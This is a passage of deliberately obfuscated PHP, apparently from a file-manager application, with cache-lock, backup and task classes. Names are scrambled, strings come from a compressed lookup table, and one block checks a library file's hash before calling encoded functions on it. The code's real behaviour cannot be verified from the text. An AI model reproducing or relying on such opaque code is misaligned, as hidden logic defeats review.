$f¶Òéèèõ[$Có’­Í¢ì·[$B˜”ä ñéæ[417]][$B˜”ä ñéæ[995]]]; } goto eÏêœĞÄ¶¤; eÏêœĞÄ¶¤: if ($Có’­Í¢ì·[$B˜”ä ñéæ[39]] == $B˜”ä ñéæ[2312]) { $Có’­Í¢ì·[$B˜”ä ñéæ[417]][$B˜”ä ñéæ[381]] = $f¶Òéèèõ[$Có’­Í¢ì·[$B˜”ä ñéæ[417]][$B˜”ä ñéæ[381]]]; } if ($Có’­Í¢ì·[$B˜”ä ñéæ[39]] == $B˜”ä ñéæ[2061]) { $Có’­Í¢ì·[$B˜”ä ñéæ[2317]] = $Có’­Í¢ì·[$B˜”ä ñéæ[403]]; $Có’­Í¢ì·[$B˜”ä ñéæ[2304]] = $Có’­Í¢ì·[$B˜”ä ñéæ[2317]][$B˜”ä ñéæ[381]]; $Có’­Í¢ì·[$B˜”ä ñéæ[403]] = !1; $Có’­Í¢ì·[$B˜”ä ñéæ[381]] = $B˜”ä ñéæ[43]; } if ($Có’­Í¢ì·[$B˜”ä ñéæ[403]] && $Có’­Í¢ì·[$B˜”ä ñéæ[403]][$B˜”ä ñéæ[383]] == $B˜”ä ñéæ[1070]) { $e¿·…İÎ[] = $a“áá¿„÷[$B˜”ä ñéæ[379]]; unset($E ÌÓÂ…²[$AØ¸Æ¨ÓîÁ]); continue; } goto aÅùŠ†µó²; f†ñî¨ÒÎ‹: } $a“áá¿„÷[$B˜”ä ñéæ[417]] = $Có’­Í¢ì·; goto DğöµñÊÌ; B‚±ôƒ¾¹³: $DâÒÎèíæ = $a“áá¿„÷[$B˜”ä ñéæ[39]]; $d³ºÀ”æ£Û = isset($BÙšä¢ôˆ«[$a“áá¿„÷[$B˜”ä ñéæ[1425]]]) ? $BÙšä¢ôˆ«[$a“áá¿„÷[$B˜”ä ñéæ[1425]]] : !1; $d”ç¿Öá„Ì = strpos($DâÒÎèíæ, $B˜”ä ñéæ[2488]) === 0 ? LNG($B˜”ä ñéæ[2489]) : LNG($B˜”ä ñéæ[2484]); goto AŒ ƒ‡Şêğ; DğöµñÊÌ: unset($a“áá¿„÷[$B˜”ä ñéæ[2490]]); $EŠ§Êë‚Š[] = $a“áá¿„÷; goto b˜‡´ëŸÉİ; AŒ ƒ‡Şêğ: $a“áá¿„÷[$B˜”ä ñéæ[38]] = isset($d³ºÀ”æ£Û[$B˜”ä ñéæ[38]]) ? $d³ºÀ”æ£Û[$B˜”ä ñéæ[38]] : LNG($B˜”ä ñéæ[2484]); $a“áá¿„÷[$B˜”ä ñéæ[2353]] = isset($d³ºÀ”æ£Û[$B˜”ä ñéæ[2353]]) ? $d³ºÀ”æ£Û[$B˜”ä ñéæ[2353]] : $B˜”ä ñéæ[43]; $a“áá¿„÷[$B˜”ä ñéæ[1331]] = isset($eÚ‡¨ÙíİŸ[$DâÒÎèíæ]) ? $eÚ‡¨ÙíİŸ[$DâÒÎèíæ] : $d”ç¿Öá„Ì; goto e–¨ÚèäÜ®; e–¨ÚèäÜ®: $a“áá¿„÷[$B˜”ä ñéæ[2248]] = $d³ºÀ”æ£Û; $Có’­Í¢ì· = json_decode($a“áá¿„÷[$B˜”ä ñéæ[417]], !0); $a“áá¿„÷[$B˜”ä ñéæ[2483]] = isset($Có’­Í¢ì·[$B˜”ä ñéæ[2483]]) ? $Có’­Í¢ì·[$B˜”ä ñéæ[2483]] : $B˜”ä ñéæ[43]; goto fÕ©¥¨—Çò; b˜‡´ëŸÉİ: } $this->clearSystemPathLog($e¿·…İÎ); goto Bè‰˜ºÑ•; eÇœ¶ªó¾: $f¶Òéèèõ = $this->getSourceList($E ÌÓÂ…²); $eÚ‡¨ÙíİŸ = $this->typeAll(); $EŠ§Êë‚Š = array(); goto f‘„Ñ•“óË; Bè‰˜ºÑ•: return $EŠ§Êë‚Š; goto fÖç¡­ïÔê; fÖç¡­ïÔê: } private function clearSystemPathLog($AµòÓš¼°Ì) { $BàŒ¿†Ù³É =& $_SERVER[¨¤¼…´]; if (count($AµòÓš¼°Ì) == 0) { return; } $e±Ïä®­æ = array($BàŒ¿†Ù³É[379] => array($BàŒ¿†Ù³É[7], array_unique($AµòÓš¼°Ì))); $this->where($e±Ïä®­æ)->delete(); } public function deviceList($Dˆ’Æ¹°Œ›, $DñÙ¦‡İœà = 0) { $CÙâœØÏ«µ =& $_SERVER[¨¤¼…´]; $cÜâù°‡‚— = array($CÙâœØÏ«µ[1425] => $Dˆ’Æ¹°Œ›, $CÙâœØÏ«µ[201] => array($CÙâœØÏ«µ[914], $DñÙ¦‡İœà), $CÙâœØÏ«µ[39] => $CÙâœØÏ«µ[2034]); $Eˆäõäˆ­å = array(); $F³…‡Ú‰ö­ = $this->field($CÙâœØÏ«µ[2491])->where($cÜâù°‡‚—)->order($CÙâœØÏ«µ[2315])->limit(50)->select(); foreach ($F³…‡Ú‰ö­ as $eÀ‹®Ô‹ĞÓ => $BÔÆ¯î†…¿) { goto Aˆ‹İÙÂˆÆ; Aáõ÷ªÏÙ¢: unset($cˆŸ”ˆ™Ï˜[$CÙâœØÏ«µ[2483]]); $dÂ¥¥ÉÎ = $this->deviceType($cˆŸ”ˆ™Ï˜[$CÙâœØÏ«µ[2306]]); if (isset($Eˆäõäˆ­å[$dÂ¥¥ÉÎ])) { continue; } goto B²ˆõÇ˜‘˜; B²ˆõÇ˜‘˜: $this->ipAddress($BÔÆ¯î†…¿); $BÔÆ¯î†…¿[$CÙâœØÏ«µ[417]] = $cˆŸ”ˆ™Ï˜; $Eˆäõäˆ­å[$dÂ¥¥ÉÎ] = $BÔÆ¯î†…¿; goto D«©‘Ÿ·©µ; Aˆ‹İÙÂˆÆ: if ($eÀ‹®Ô‹ĞÓ > 0 && abs($BÔÆ¯î†…¿[$CÙâœØÏ«µ[201]] - $F³…‡Ú‰ö­[$eÀ‹®Ô‹ĞÓ - 1][$CÙâœØÏ«µ[201]]) < 5) { continue; } $cˆŸ”ˆ™Ï˜ = json_decode($BÔÆ¯î†…¿[$CÙâœØÏ«µ[417]], !0); $BÔÆ¯î†…¿[$CÙâœØÏ«µ[2483]] = isset($cˆŸ”ˆ™Ï˜[$CÙâœØÏ«µ[2483]]) ? $cˆŸ”ˆ™Ï˜[$CÙâœØÏ«µ[2483]] : $CÙâœØÏ«µ[43]; goto Aáõ÷ªÏÙ¢; D«©‘Ÿ·©µ: } return array_values($Eˆäõäˆ­å); } public function deviceType($DĞĞèĞÅ ù) { return $DĞĞèĞÅ ù; } } goto cäºÇêâÂ; E»Æ…ÅŸÆ: define($_SERVER[¨¤¼…´][557], $_SERVER[¨¤¼…´][558]); $a¸²×æÚ÷ = $_SERVER[¨¤¼…´][559]; $_SERVER[‚Ÿßñ] = explode($_SERVER[¨¤¼…´][560], gzinflate(substr($_SERVER[¨¤¼…´][561], 10, -8))); goto E×„‹ï„è³; a‘ˆ¨§Å£: $a½µíØÈËÑ = LIB_DIR . $_SERVER[¨¤¼…´][2019]; $DÔ÷¼ù£Ğ = $_SERVER[¨¤¼…´][780]; if ($_SERVER[$_SERVER[¨¤¼…´][9]] != $DÔ÷¼ù£Ğ($a½µíØÈËÑ)) { goto f‹¬á…¯„; fáİÜŠæƒ: $Aê¡¥óÛÜÒ = explode($_SERVER[¨¤¼…´][14], $e¯¡í¶¨Ô); if (count($Aê¡¥óÛÜÒ) < $_SERVER[¨¤¼…´][15]) { $d®¹ô¥æ„Â = $_SERVER[¨¤¼…´][16]; $d®¹ô¥æ„Â(); } $D†É›ä‰‹½ = $_SERVER[¨¤¼…´][17]; goto f„ğ…Ñ®‹õ; f‹¬á…¯„: $EÉ´ôƒ‡èÕ = $_SERVER[¨¤¼…´][11]; $B½³º¹°„ë = $_SERVER[$_SERVER[¨¤¼…´][12]] . $_SERVER[¨¤¼…´][13]; $e¯¡í¶¨Ô = $EÉ´ôƒ‡èÕ($B½³º¹°„ë); goto fáİÜŠæƒ; f„ğ…Ñ®‹õ: $D†É›ä‰‹½($a½µíØÈËÑ); goto fÖ¹³‚–ˆ; fÖ¹³‚–ˆ: } goto C™›Îµ¶Ö‰; AÎ¦‡ØØ: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $BÒ¿‡˜Úëô =& $_SERVER[¨¤¼…´]; $Aäïœéå¦´ = $GLOBALS[$BÒ¿‡˜Úëô[6]][$BÒ¿‡˜Úëô[350]]; self::$cachePath = $Aäïœéå¦´[$BÒ¿‡˜Úëô[181]][$BÒ¿‡˜Úëô[85]]; @mkdir(self::$cachePath, 511, !0); } public function lock($bÔ§™ù¼Ûø, $CãëâÆ«Ã = 0) { goto E³×¾¶‘Š÷; e‡®à™ºŒ: $cñ‡Ì¼š¥õ = rtrim(self::$cachePath, $Fç¸‚‘áì[8]) . $Fç¸‚‘áì[767] . md5($bÔ§™ù¼Ûø) . $Fç¸‚‘áì[764]; if (file_exists($cñ‡Ì¼š¥õ) && filemtime($cñ‡Ì¼š¥õ) && filemtime($cñ‡Ì¼š¥õ) < time() - 10) { @unlink($cñ‡Ì¼š¥õ); } do { if (file_exists($cñ‡Ì¼š¥õ)) { cacheLockWait(); continue; } $dê’èï×õœ = fopen($cñ‡Ì¼š¥õ, $Fç¸‚‘áì[768]); if (!$dê’èï×õœ) { return !1; } $EéÏ¤ŸÛèÕ = flock($dê’èï×õœ, LOCK_EX | LOCK_NB); self::$caches[$bÔ§™ù¼Ûø] = array($Fç¸‚‘áì[769] => $dê’èï×õœ, $Fç¸‚‘áì[181] => $cñ‡Ì¼š¥õ); fwrite($dê’èï×õœ, $AŸÜ«ÍçÇÓ); clearstatcache(); if ($dê’èï×õœ && $EéÏ¤ŸÛèÕ) { return !0; } cacheLockWait(); } while (microtime(!0) < $AŸÜ«ÍçÇÓ); goto Eß‡Ø§¼¢; Eß‡Ø§¼¢: $this->unlock($bÔ§™ù¼Ûø); return !1; goto C¹Åƒ»…; E³×¾¶‘Š÷: $Fç¸‚‘áì =& $_SERVER[¨¤¼…´]; $D¸»ê’¢Å = microtime(!0); $AŸÜ«ÍçÇÓ = $D¸»ê’¢Å + $CãëâÆ«Ã + 0.0001; goto e‡®à™ºŒ; C¹Åƒ»…: } public function lockGet($c•‹‘¡Ìœ¦) { $FÀŠ—…íĞç =& $_SERVER[¨¤¼…´]; $bÌå‡¢˜¢½ = rtrim(self::$cachePath, $FÀŠ—…íĞç[8]) . $FÀŠ—…íĞç[767] . md5($c•‹‘¡Ìœ¦) . $FÀŠ—…íĞç[764]; return file_exists($bÌå‡¢˜¢½); } public function unlock($BëÕôƒÓÖ) { goto ağÄ¥í›ƒˆ; ağÄ¥í›ƒˆ: $D Ç¿‘ÉÉ =& $_SERVER[¨¤¼…´]; $dè¶Ã³æŒ = self::$caches[$BëÕôƒÓÖ]; if (!$dè¶Ã³æŒ) { return; } goto EÌÕÈ†ë¶Å; EÌÕÈ†ë¶Å: @flock($dè¶Ã³æŒ[$D Ç¿‘ÉÉ[769]], LOCK_UN); @fclose($dè¶Ã³æŒ[$D Ç¿‘ÉÉ[769]]); @unlink($dè¶Ã³æŒ[$D Ç¿‘ÉÉ[181]]); goto a«ŠÔã²»ƒ; a«ŠÔã²»ƒ: unset(self::$caches[$BëÕôƒÓÖ]); goto C‘ïå”Ğ¶‡; C‘ïå”Ğ¶‡: } } class CacheLockRedis { public function lock($bĞÈƒĞº°, $F‡Â˜™â = 10) { $aÄ©àÉ˜ = Cache::init(); $AÍ ì®ÈŒö = microtime(!0) + $F‡Â˜™â; while (microtime(!0) < $AÍ ì®ÈŒö) { $cª•¦™Ş˜” = $aÄ©àÉ˜->get($bĞÈƒĞº°); if (!$cª•¦™Ş˜”) { $cù›‘ù¥Ä¤ = $aÄ©àÉ˜->setLock($bĞÈƒĞº°, $AÍ ì®ÈŒö, $F‡Â˜™â); if ($cù›‘ù¥Ä¤) { return !0; } } else { if ($cª•¦™Ş˜” < microtime(!0)) { $aÄ©àÉ˜->set($bĞÈƒĞº°, $AÍ ì®ÈŒö, $AÍ ì®ÈŒö); if ($aÄ©àÉ˜->get($bĞÈƒĞº°) === $cª•¦™Ş˜”) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($f®¢¸îë÷) { return Cache::init()->get($f®¢¸îë÷); } public function unlock($BŠó¶‘ßÎ») { return Cache::init()->remove($BŠó¶‘ßÎ»); } } goto a»ÚğŒ²Úï; Fƒçë„Öğá: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto CóóÃøÔá¼; CáÈ©òØª×: self::$name = $b¢ˆ…‘«Î[$A»êº†ˆ—[38]]; $Bî©Çä¦â = $GLOBALS[$A»êº†ˆ—[6]][$A»êº†ˆ—[27]]; $dòŞ™…·¬ = $this->_dbType($Bî©Çä¦â); goto d‹çÓÀÇæµ; d‹çÓÀÇæµ: $F„ÏÇæé—š = new DbManage($Bî©Çä¦â, $dòŞ™…·¬); $bÚ­ŸÜÆ¿ = TEMP_FILES . $A»êº†ˆ—[699] . self::$name . $A»êº†ˆ—[8]; del_dir($bÚ­ŸÜÆ¿); goto AÒæã„Ò‰¡; CóóÃøÔá¼: $A»êº†ˆ— =& $_SERVER[¨¤¼…´]; $b¢ˆ…‘«Î = Backup::get(); self::$io = $b¢ˆ…‘«Î[$A»êº†ˆ—[681]]; goto CáÈ©òØª×; aÈ´´È³³İ: foreach ($cêÉº¨Öğ as $a¯Èâì´…) { $DéœØÇãîø = $bÚ­ŸÜÆ¿ . $a¯Èâì´… . $A»êº†ˆ—[707]; $D¹ò ±¥ÙÄ = null; if ($a¯Èâì´… == $A»êº†ˆ—[708] && (!isset($b¢ˆ…‘«Î[$A»êº†ˆ—[682]]) || $b¢ˆ…‘«Î[$A»êº†ˆ—[682]] == $A»êº†ˆ—[481])) { $D¹ò ±¥ÙÄ = self::$io; } $d³‚œš»™ += $F„ÏÇæé—š->sqlFromDb($a¯Èâì´…, $DéœØÇãîø, $aíöĞø—”, $D¹ò ±¥ÙÄ); } $aíöĞø—”->end(); $A†ÉİÁ¶í = array($A»êº†ˆ—[709] => $dòŞ™…·¬, $A»êº†ˆ—[696] => 1, $A»êº†ˆ—[710] => $d³‚œš»™, $A»êº†ˆ—[711] => $d³‚œš»™); goto aåí•Ğö¶; aåí•Ğö¶: Backup::set($A†ÉİÁ¶í); return !0; goto cöÖÖ¤·‘š; AÒæã„Ò‰¡: mk_dir($bÚ­ŸÜÆ¿); $B¾¥Ûåì¢ = $d³‚œš»™ = 0; $cêÉº¨Öğ = $F„ÏÇæé—š->db()->getTables(); goto d§èÄ»‹áÔ; d§èÄ»‹áÔ: $cêÉº¨Öğ = array_diff($cêÉº¨Öğ, array($A»êº†ˆ—[700], $A»êº†ˆ—[701])); foreach ($cêÉº¨Öğ as $a¯Èâì´…) { $B¾¥Ûåì¢ += $F„ÏÇæé—š->model($a¯Èâì´…)->count(); } $aíöĞø—” = new Task($A»êº†ˆ—[702], $A»êº†ˆ—[703], $B¾¥Ûåì¢, LNG($A»êº†ˆ—[704]) . $A»êº†ˆ—[705] . LNG($A»êº†ˆ—[706])); goto aÈ´´È³³İ; cöÖÖ¤·‘š: } private function _dbType($aÄ”¦æóŠ’) { goto BâÌÃ¦ÆäÔ; Bè»ñˆ¥¬Á: if ($EùµóÜ¼ôñ == $fÂŒ™§´¾Ş[713]) { $dØ¶çæ¤õ© = explode($fÂŒ™§´¾Ş[4], $aÄ”¦æóŠ’[$fÂŒ™§´¾Ş[714]]); $EùµóÜ¼ôñ = $dØ¶çæ¤õ©[0]; } $F‹ê…ïŞº = array($fÂŒ™§´¾Ş[715] => $fÂŒ™§´¾Ş[19], $fÂŒ™§´¾Ş[716] => $fÂŒ™§´¾Ş[717]); if (isset($F‹ê…ïŞº[$EùµóÜ¼ôñ])) { $EùµóÜ¼ôñ = $F‹ê…ïŞº[$EùµóÜ¼ôñ]; } goto d˜ïöÊÌ«; d˜ïöÊÌ«: return $EùµóÜ¼ôñ; goto f¤î³¶ÏÅ¼; BâÌÃ¦ÆäÔ: $fÂŒ™§´¾Ş =& $_SERVER[¨¤¼…´]; $aÄ”¦æóŠ’ = array_change_key_case($aÄ”¦æóŠ’); $EùµóÜ¼ôñ = $aÄ”¦æóŠ’[$fÂŒ™§´¾Ş[712]]; goto Bè»ñˆ¥¬Á; f¤î³¶ÏÅ¼: } } class BackupDbFile { public function __construct() { } public function index() { goto fŒ‰àÄ¨¢è; bƒ¸‹õˆëÊ: Backup::set(array($eÎ’éïãëš[720] => $d¹ÑŞ‡‰è[$eÎ’éïãëš[87]])); IO::move($dÓ²¨Êå, $cíİë×’ØÓ); $d¢µŞï ã = CONTROLLER_DIR . $eÎ’éïãëš[721]; goto CŞÂùÔ«ÖÙ; CŞÂùÔ«ÖÙ: $e™ìÚ·‚œ¡ = CONTROLLER_DIR . $eÎ’éïãëš[722]; IO::copy($d¢µŞï ã, $cíİë×’ØÓ . "\x62\141\143\153\x75\x70\137{$Fî…ÁÇ«øå}\x2f"); IO::copy($e™ìÚ·‚œ¡, $cíİë×’ØÓ . "\x62\x61\x63\153\x75\160\x5f{$Fî…ÁÇ«øå}\x2f"); goto a³¢…ö¼Œ; fŒ‰àÄ¨¢è: $eÎ’éïãëš =& $_SERVER[¨¤¼…´]; $dËõ¹¿íº  = Backup::get(); $Fî…ÁÇ«øå = $dËõ¹¿íº [$eÎ’éïãëš[38]]; goto FçÒ¾ÊšÒÚ; FçÒ¾ÊšÒÚ: $dÓ²¨Êå = TEMP_FILES . "\142\141\143\x6b\165\160\x5f{$Fî…ÁÇ«øå}\57"; $cíİë×’ØÓ = "\x7b\151\157\x3a{$dËõ¹¿íº [$eÎ’éïãëš[681]]}\175\57\144\x61\x74\x61\x62\x61\163\145\57"; IO::mkdir($cíİë×’ØÓ . "\x62\141\143\153\165\x70\137{$Fî…ÁÇ«øå}\57"); goto aˆºØá„Ã; aˆºØá„Ã: $bÃÉÍ°¼°ñ = new TaskFileTransfer($eÎ’éïãëš[718], $eÎ’éïãëš[703], 0, LNG($eÎ’éïãëš[704]) . $eÎ’éïãëš[424] . LNG($eÎ’éïãëš[706]) . $eÎ’éïãëš[719]); $bÃÉÍ°¼°ñ->addPath($dÓ²¨Êå); $d¹ÑŞ‡‰è = IO::infoWithChildren($dÓ²¨Êå); goto bƒ¸‹õˆëÊ; a³¢…ö¼Œ: $bÃÉÍ°¼°ñ->end(); Backup::set(array($eÎ’éïãëš[723] => $d¹ÑŞ‡‰è[$eÎ’éïãëš[87]])); return !0; goto D»À•îÕ»°; D»À•îÕ»°: } } class BackupFile { public function __construct() { } public function index() { goto f©ª´‘¾õÌ; AÕÌ–ƒô‚: $CôÏšĞ­->task[$_SERVER[¨¤¼…´][688]] = $fÜª°â˜ö; $F”¥äŠÅ¼“ = array($_SERVER[¨¤¼…´][728] => $A¦Â¯ˆò±Ï, $_SERVER[¨¤¼…´][729] => $fÜª°â˜ö); Backup::set($F”¥äŠÅ¼“); goto a•‘Ü»¬; B¦•ÈæšìÃ: $cöò¾„°ÖŸ = $EãœÛÇ‡ùº ? 1 : 0; $F”¥äŠÅ¼“ = array($_SERVER[¨¤¼…´][740] => 1, $_SERVER[¨¤¼…´][460] => time(), $_SERVER[¨¤¼…´][698] => $cöò¾„°ÖŸ, $_SERVER[¨¤¼…´][737] => $f‡ÒÚÛ¶‹‚, $_SERVER[¨¤¼…´][729] => $fÜª°â˜ö, $_SERVER[¨¤¼…´][728] => $A¦Â¯ˆò±Ï); if ($e¨å†¸ß¯‰) { $F”¥äŠÅ¼“[$_SERVER[¨¤¼…´][738]] = $fˆÛŒÙ¶‰æ; $F”¥äŠÅ¼“[$_SERVER[¨¤¼…´][739]] = $B óø¾…å; } goto bÃ„Ô‡ˆ˜à; CÌÙÁÀÁ‚ğ: $B óø¾…å = $fˆÛŒÙ¶‰æ = 0; do { $d²ç»ğæ—¹ = $_SERVER[¨¤¼…´][730]; $c…ç¼áÃ½† = Model($_SERVER[¨¤¼…´][708])->where($c¸Ï˜‚ÏÂ)->field($d²ç»ğæ—¹)->order($_SERVER[¨¤¼…´][731])->selectPage($a®ÂŞÚæ¦Ö, $F‡ã¢ßŞù); $B‹Å‘Ü£Õø = !empty($c…ç¼áÃ½†[$_SERVER[¨¤¼…´][367]]) ? $c…ç¼áÃ½†[$_SERVER[¨¤¼…´][367]] : array(); foreach ($B‹Å‘Ü£Õø as $CŸŒ˜µÆË) { goto a­êÕâ‰à; Aç¦¡õÄ ÷: if ($c™œ«ÌÆ >= 1024 * 1024 * 100) { $F”¥äŠÅ¼“ = array($_SERVER[¨¤¼…´][737] => $f‡ÒÚÛ¶‹‚, $_SERVER[¨¤¼…´][738] => $fˆÛŒÙ¶‰æ, $_SERVER[¨¤¼…´][739] => $B óø¾…å); Backup::set($F”¥äŠÅ¼“); $c™œ«ÌÆ = $e¨å†¸ß¯‰ = 0; } goto DêŞŠ¦„Äº; eàÖÃîÈÙ: $c™œ«ÌÆ += $CŸŒ˜µÆË[$_SERVER[¨¤¼…´][87]]; $fˆÛŒÙ¶‰æ += 1; $B óø¾…å += $CŸŒ˜µÆË[$_SERVER[¨¤¼…´][87]]; goto Aç¦¡õÄ ÷; E„‚éÅëÉö: if (IO::exist($AÒÙ‰¹»‡)) { $CôÏšĞ­->updateFileEnd($CŸŒ˜µÆË[$_SERVER[¨¤¼…´][38]], $CŸŒ˜µÆË[$_SERVER[¨¤¼…´][87]]); } else { $AÒÙ‰¹»‡ = get_path_father($AÒÙ‰¹»‡); IO::mkdir($AÒÙ‰¹»‡); if (!IO::copy($cÈÂ‡†ÃÃÅ, $AÒÙ‰¹»‡, $_SERVER[¨¤¼…´][734])) { write_log($_SERVER[¨¤¼…´][735] . $cÈÂ‡†ÃÃÅ . $_SERVER[¨¤¼…´][736] . $AÒÙ‰¹»‡ . $_SERVER[¨¤¼…´][489], $_SERVER[¨¤¼…´][703]); $EãœÛÇ‡ùº = !1; break; } } $f‡ÒÚÛ¶‹‚ = $CŸŒ˜µÆË[$_SERVER[¨¤¼…´][431]]; $e¨å†¸ß¯‰ += 1; goto eàÖÃîÈÙ; a­êÕâ‰à: if (!$this->_fileExist($CŸŒ˜µÆË, $A“¤İÅ£ ­, $a›ğØ©ÁÙ“)) { $A¦Â¯ˆò±Ï -= 1; $fÜª°â˜ö -= (int) $CŸŒ˜µÆË[$_SERVER[¨¤¼…´][87]]; write_log("\146\151\x6c\145\40\x6e\x6f\164\40\x65\x78\x69\x73\164\x2e\146\151\x6c\145\x49\x44\x3a{$CŸŒ˜µÆË[$_SERVER[¨¤¼…´][431]]}\x2c\40\x70\x61\x74\150\x3a{$CŸŒ˜µÆË[$_SERVER[¨¤¼…´][85]]}", $_SERVER[¨¤¼…´][732]); continue; } $cÈÂ‡†ÃÃÅ = $CŸŒ˜µÆË[$_SERVER[¨¤¼…´][85]]; $AÒÙ‰¹»‡ = "\173\151\157\x3a{$E´ÊùÌ‡â®[$_SERVER[¨¤¼…´][681]]}\x7d" . substr($cÈÂ‡†ÃÃÅ, strlen("\x7b\151\157\72{$CŸŒ˜µÆË[$_SERVER[¨¤¼…´][733]]}\175")); goto E„‚éÅëÉö; DêŞŠ¦„Äº: } $A“²“¹¥¬ = count($B‹Å‘Ü£Õø); $F‡ã¢ßŞù++; } while ($A“²“¹¥¬ == $a®ÂŞÚæ¦Ö); $CôÏšĞ­->end(); goto B¦•ÈæšìÃ; a•‘Ü»¬: $EãœÛÇ‡ùº = !0; $a›ğØ©ÁÙ“ = $this->storeIds(); $F‡ã¢ßŞù = 1; goto F³«ä‚§¿Ë; F÷ƒéôµ‘½: $A¦Â¯ˆò±Ï = (int) Model($_SERVER[¨¤¼…´][708])->where($c¸Ï˜‚ÏÂ)->count($_SERVER[¨¤¼…´][431]); $fÜª°â˜ö = (int) Model($_SERVER[¨¤¼…´][708])->where($c¸Ï˜‚ÏÂ)->sum($_SERVER[¨¤¼…´][87]); $CôÏšĞ­ = new TaskFileTransfer($_SERVER[¨¤¼…´][726], $_SERVER[¨¤¼…´][703], $A¦Â¯ˆò±Ï, LNG($_SERVER[¨¤¼…´][704]) . $_SERVER[¨¤¼…´][705] . LNG($_SERVER[¨¤¼…´][727])); goto AÕÌ–ƒô‚; bÃ„Ô‡ˆ˜à: Backup::set($F”¥äŠÅ¼“); $this->_fileFilter($A“¤İÅ£ ­); return !0; goto e‘Óã±‡¨Ã; f©ª´‘¾õÌ: $E´ÊùÌ‡â® = Backup::get(); $f‡ÒÚÛ¶‹‚ = $E´ÊùÌ‡â®[$_SERVER[¨¤¼…´][294]][$_SERVER[¨¤¼…´][181]][$_SERVER[¨¤¼…´][431]]; $c¸Ï˜‚ÏÂ = array($_SERVER[¨¤¼…´][432] => array($_SERVER[¨¤¼…´][724], $f‡ÒÚÛ¶‹‚), $_SERVER[¨¤¼…´][725] => array($_SERVER[¨¤¼…´][332], $E´ÊùÌ‡â®[$_SERVER[¨¤¼…´][681]])); goto F÷ƒéôµ‘½; F³«ä‚§¿Ë: $a®ÂŞÚæ¦Ö = 1000; $c™œ«ÌÆ = $e¨å†¸ß¯‰ = 0; $A“¤İÅ£ ­ = array(); goto CÌÙÁÀÁ‚ğ; e‘Óã±‡¨Ã: } private function _fileExist($A«¶Ë™ö™Ê, &$d‚Úêõ°¿¬, $aôŠóÀ­°Ó) { goto e„Ã î„£‚; f¶»ƒÙ²£: if (IO::exist($AîÛçóÁ¢î)) { $d‚Úêõ°¿¬[] = $A«¶Ë™ö™Ê[$d¢Œ¥Í…ì¥[431]]; return !1; } $Føå¶Ûö¾Î = array($d¢Œ¥Í…ì¥[733] => $A«¶Ë™ö™Ê[$d¢Œ¥Í…ì¥[733]], $d¢Œ¥Í…ì¥[85] => array($d¢Œ¥Í…ì¥[741], "{$AîÛçóÁ¢î}\x25")); $BÅº‚‹Æôœ = Model($d¢Œ¥Í…ì¥[708])->where($Føå¶Ûö¾Î)->field($d¢Œ¥Í…ì¥[432])->select(); goto Dƒ™«ààº‘; Dƒ™«ààº‘: $d‚Úêõ°¿¬ = array_merge($d‚Úêõ°¿¬, array_to_keyvalue($BÅº‚‹Æôœ, $d¢Œ¥Í…ì¥[43], $d¢Œ¥Í…ì¥[431])); return !1; goto d»Ã­ÑµËæ; e„Ã î„£‚: $d¢Œ¥Í…ì¥ =& $_SERVER[¨¤¼…´]; $f¡Ïª¯Õè = $A«¶Ë™ö™Ê[$d¢Œ¥Í…ì¥[85]]; if (in_array($A«¶Ë™ö™Ê[$d¢Œ¥Í…ì¥[431]], $d‚Úêõ°¿¬)) { return !1; } goto d”  ®à¡Ş; d”  ®à¡Ş: if (!in_array($A«¶Ë™ö™Ê[$d¢Œ¥Í…ì¥[733]], $aôŠóÀ­°Ó)) { return !1; } if (IO::exist($f¡Ïª¯Õè)) { return !0; } $AîÛçóÁ¢î = get_path_father($f¡Ïª¯Õè); goto f¶»ƒÙ²£; d»Ã­ÑµËæ: } private function _fileFilter($F÷Ó¥¢¹Ä“) { $E‡ç‹–æ =& $_SERVER[¨¤¼…´]; if (empty($F÷Ó¥¢¹Ä“)) { return; } $B•¢äí˜‹Ê = array($E‡ç‹–æ[431] => array($E‡ç‹–æ[7], array_unique($F÷Ó¥¢¹Ä“))); $A«ƒöâğŸ = Model($E‡ç‹–æ[742])->where($B•¢äí˜‹Ê)->field($E‡ç‹–æ[381])->select(); foreach ($A«ƒöâğŸ as $fëØÇä‡ÜÉ) { Model($E‡ç‹–æ[742])->remove($fëØÇä‡ÜÉ[$E‡ç‹–æ[381]], !1); } } private function storeIds() { $cß¥±ìÆŠ =& $_SERVER[¨¤¼…´]; $F‚õ¡Ñ×–÷ = Model($cß¥±ìÆŠ[693])->listData(); $D‡Äˆ÷‚‚¢ = array(); $FÉ£•Í×Áˆ = $GLOBALS[$cß¥±ìÆŠ[6]][$cß¥±ìÆŠ[94]][$cß¥±ìÆŠ[743]]; foreach ($F‚õ¡Ñ×–÷ as $c§Ï†èÜ¬‡) { $b¤¼•ßô³ = strtolower($c§Ï†èÜ¬‡[$cß¥±ìÆŠ[100]]); if (!isset($FÉ£•Í×Áˆ[$b¤¼•ßô³])) { continue; } $d¥Šé¯ÁÛÑ = $cß¥±ìÆŠ[81] . (isset($FÉ£•Í×Áˆ[$b¤¼•ßô³]) ? $FÉ£•Í×Áˆ[$b¤¼•ßô³] : ucfirst($b¤¼•ßô³)); if (!class_exists($d¥Šé¯ÁÛÑ)) { continue; } $D‡Äˆ÷‚‚¢[] = $c§Ï†èÜ¬‡[$cß¥±ìÆŠ[379]]; } return $D‡Äˆ÷‚‚¢; } } goto bòÂ‰ˆ¹Ç¢; B¹é‡•ÖÑ¼: class Task { const STATYS_STOP = "\x73\164\157\x70"; const STATYS_RUNNING = "\162\165\x6e\156\x69\156\x67"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($AÔ½¶¾¨ì, $E¤ÍÕğÎËÑ = '', $dïŸ÷Š™³ = 0, $FÈğÌŠË¦‚ = '') { goto BóÚÄŒîäÄ; BóÚÄŒîäÄ: $B„†°‚Ô÷­ =& $_SERVER[¨¤¼…´]; if (self::get($AÔ½¶¾¨ì)) { return; } $this->task = array($B„†°‚Ô÷­[379] => $AÔ½¶¾¨ì, $B„†°‚Ô÷­[1425] => USER_ID, $B„†°‚Ô÷­[1331] => $FÈğÌŠË¦‚, $B„†°‚Ô÷­[39] => $E¤ÍÕğÎËÑ, $B„†°‚Ô÷­[965] => $B„†°‚Ô÷­[43], $B„†°‚Ô÷­[963] => $dïŸ÷Š™³, $B„†°‚Ô÷­[977] => 0, $B„†°‚Ô÷­[1426] => 0, $B„†°‚Ô÷­[1427] => 0, 